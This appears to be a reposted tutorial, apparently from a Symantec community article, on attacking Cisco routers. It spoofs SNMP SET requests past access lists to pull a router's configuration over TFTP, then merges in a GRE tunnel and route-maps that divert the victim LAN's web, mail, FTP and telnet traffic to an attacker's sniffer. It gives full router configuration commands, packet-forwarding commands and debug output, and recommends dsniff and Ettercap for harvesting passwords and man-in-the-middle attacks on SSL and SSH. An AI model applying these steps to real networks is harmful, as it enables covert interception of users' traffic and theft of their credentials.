"How would the attacker know about the access list / SNMP RW community name in the first place?"

This could be done with a simple brute force attack, 
not only with SNMP community names, but also with source IP addresses, and such a tool already exists.


Source: https://community.broadcom.com/symantecenterprise/communities/community-home/librarydocuments/viewdocument?DocumentKey=50318646-6402-48f0-82db-25d00ac3d76c&CommunityKey=1ecf5f55-9545-44d6-b0f4-4e4a7f5f5e68&tab=librarydocuments

As discussed in "Exploiting Cisco Routers, Part 1" it is possible to get a Cisco router to pull/send 
its configuration file with TFTP, using an SNMP SET command.

By sending an SNMP set request with a spoofed source IP address 
(from the RFC1918 range-192.168.1.0), 
we should be able to get the Victim router to send us its configuration file. 
This is assuming we know the private community string, as well as the ACLs implemented on the SNMP RW community string.

-----------------
-----------------
-----------------
Bypassing the SNMP access list

Lets start by creating our forged SNMP request. 
Using a nifty little Perl script and Ethereal, 
we capture a standard "copy config" SNMP SET request, which we can use as a baseline packet.


Once executed, the following SNMP packet is captured and shown below in Figure 2.. 
As expected, this request is declined by the router, and no configuration file is sent.

Notice the attacker's source IP address (80.179.76.227). 
Now, Using a hex editor, we change the source IP address, and fix the packet headers. 
C0 A8 01 05 (in hex) represents our spoofed source IP address, 192.168.1.5, as shown below in Figure 3.

We then send the packet using file2cable (or any packet generator)

Soon after, our TFTP server gets a connection.

Notice the source IP for the SNMP request, and the TFTP write Request (packets 1 and 2). 
The packet bypasses the SNMP access list, and we get the Victim router configuration file by TFTP.

-----------------
-----------------
-----------------
The GRE tunnel

Generic Routing Encapsulation (GRE) is a tunneling protocol designed for encapsulation of arbitrary 
kinds of network layer packets inside arbitrary kinds of network layer packets. 
One common use for GRE is to connect IPX network segments over an IP only backbone. 
In this case you would create a GRE tunnel from one router to the next to transport the IPX packets 
back and forth over the IP backbone.

For our purposes, however, we need a twist on the standard usage of GRE tunneling. The plan is to do the following:

  - Create the GRE tunnel from the Victim border router to the attacker router.
  - Specify which traffic will be sent through the tunnel.
  - Have the attacker router decapsulate the GRE packets and forward them to the attacking (sniffer) computer for analysis.


-----------------
-----------------
-----------------
The Victim router

We need to create the GRE tunnel on the victim router. 
Since we don't have console / terminal access to this router, 
we can simply edit the downloaded configuration file, and once it's ready, 
merge it back to the router using a spoofed SNMP SET request.

We add the following lines to the victim router configuration file:

interface tunnel0 ip address 192.168.10.1 255.255.255.0 tunnel source Ethernet0/0 tunnel 
destination  tunnel mode gre ip

What this is means is that:

  - We create the tunnel0 interface and specify an IP address from the 192.168.10.x network. 
        Both sides of the tunnel need to be in the same network in order for them to communicate.
  - We specify the Ethernet0/0 interface as the tunnel source (otherwise where would the tunnel start from?).
  - The tunnel destination is the IP of the attacker's border router external interface.
  - The final command is optional since the tunnel will default to GRE (we type it in just to make sure).
  
We can now configure access-lists to specify which traffic is to be forwarded, 
and route-maps to actually perform the packet forwarding.

We add the following lines to the victim router configuration file:

access-list 101 permit tcp any any eq 443 access-list 101 permit tcp any any eq 80 access-list 101 permit tcp any any eq 21 access-list 101 permit tcp any any eq 20 access-list 101 permit tcp any any eq 23 access-list 101 permit tcp any any eq 25 access-list 101 permit tcp any any eq 110

This means that this access-list will match SSL, http, ftp-control / data, telnet, smtp, and pop3 data.

Now that the traffic has been matched it must be redirected using route-maps. 

We add the following lines to the Victim router configuration file:
router-map divert-traffic     match ip address 101    set ip next-hop 192.168.10.2 interface Ethernet0/0    ip policy route-map divert-traffic

Which means:
  - We specify a name for the route map (divert-traffic) and then use the match command to use access-list 101 
      as the match condition.
  - We specify the GRE tunnel IP address of the Attacker as the next hop IP.
  - We apply the route-map on the victim's internal LAN interface. This will cause it to evaluate all traffic coming in and out of the Ethernet0/0.

-----------------
-----------------
-----------------
The Attacking router

The configuration to be used on the attacking router is a bit more elaborate since we need to specify 
two route-maps 
  - one to send traffic to attacker (sniffer)
  - second to send traffic back to the Victim router for normal forwarding. 

It is crucial that we forward the tunneled data back to the Victim router so the client victim does not lose connectivity.

We start by creating the GRE tunnel on the attacker's router:
Attacker(config)# interface tunnel0 Attacker(config-if)# ip address 192.168.10.2 255.255.255.0 Attacker(config-if)# tunnel source Ethernet0/0 Attacker(config-if)# tunnel destination  Attacker(config-if)# tunnel mode gre ip Attacker(config)# access-list 101 permit ip any any Attacker(config)# router-map divert-to-sniffer Attacker(config-route-map)# match ip address 101 Attacker(config-route-map)# set ip next-hop 192.168.3.5 Attacker(config-route-map)# exit Attacker(config)# interface tunnel0 Attacker(config-if)# ip policy route-map divert-to-sniffer

Which means:
    - We create an access list to match all traffic.
    - We create the route-map and give it the name divert-to-sniffer 
          (this route-map will forward tunneled data to the sniffer).
    - The access-list is used as a match condition.
    - We specify the attacker's (sniffer) IP as the next hop.
    - We apply the route-map to the tunnel interface.

It is very important we use a route-map to forward the data. The router receives the tunneled data in GRE encapsulation, 
which we can't view without decoding the packets. By redirecting received packets out onto the attacker (sniffer),
The router will forward the packets as standard IP packets without the GRE encapsulation.

Attacker(config-if)# route-map divert-out Attacker(config-route-map)# match ip address 101 Attacker(config-route-map)# set ip next-hop 192.168.10.1 Attacker(config-route-map)# exit Attacker(config)# interface ethernet0/0 Attacker(config-if)# ip policy route-map divert-out

This additional configuration means:
      - The divert-out route-map will forward the tunneled data back to the Victim router after the attacker (sniffer) has captured and forwarded it back out.
      - We apply the route-map to the Ethernet interface.
     
  
-----------------
-----------------
-----------------   
The Attacker (Sniffer)

After completing all necessary router configurations 
we need to configure the attacker's computer (the sniffer) to capture and forward data correctly. 
The computer must be configured with an IP address and a gateway. 
It is vital that the computer be configured to forward packets back out using either one of the following commands:

root@whax:~# echo 1 > /proc/sys/net/ipv4/ip_forward -or- root@whax:~# fragrouter -B1

Without the forwarding, the Victim client will be DoS'ed, rendering this attack useless.

-----------------
-----------------
-----------------  
Initiating the attack

Once everything is configured, all that's left to do is to upload the new,
modified victim router configuration file. 

This will effectively activate the GRE tunnel and redirect all traffic from the victim client's LAN, to the attacker (sniffer).

We create a spoofed SNMP SET request which kindly asks the router to get its new configuration file from our TFTP server, 
and merge it with its current configuration. Again, we use a non-spoofed request as our packet baseline:

We capture this packet, and modify its source IP address and packet headers as shown in Figure 5.

Once sent, we see that a TFTP connection is made to our attacking computer in Figure 6.

Notice the TFTP Read Request (packet 2). 
Once again, the packet bypasses the SNMP access list and pulls/merges the modified configuration file by TFTP. 
The Victim router debug information gives some interesting insight into the attack:
Notice that the TFTP server address is a separate parameter from the attacker's source IP address 
(as opposed to most TCP based traffic). 
The tunnel is now open and operational, and effectively resembles the diagram below in Figure 7.


We can verify the operation of the tunnel by issuing a debug command on the attacker's router:
Attacker# debug tunnel *Mar  3 06:38: Tunnel0: GRE/IP to classify 212.199.145.242 ->80.179.20.55 (len=108 type=0x800 ttl=253 tos=0x0) *Mar  3 06:38: Tunnel0: adjacency fixup, 80.179.20.55 -> 212.199.145.242, tos=0x0 *Mar  3 06:38: Tunnel0: GRE/IP to classify 212.199.145.242 ->80.179.20.55 (len=108 type=0x800 ttl=253 tos=0x0) *Mar  3 06:38: Tunnel0: adjacency fixup, 80.179.20.55 -> 212.199.145.242, tos=0x0g   all

Suppose the Victim client searches Google for the term "GRE Sniffing," in Figure 8.

When this happens, the following appears in the ethereal capture on the attacker's computer (the sniffer)

Apart from using a customized sniffer (such as dsniff) to capture clear-text passwords, 
we can now implement sophisticated man-in-the-middle attacks against our victim client. 

Ettercap is a great tool of choice as it will perform a man-in-the-middle attack against both the SSL and 
SSH encrypted protocols in addition to harvesting other types of passwords. 
Traffic can also be manipulated and changed using Ettercap filters. The possibilities are virtually endless.










    
     
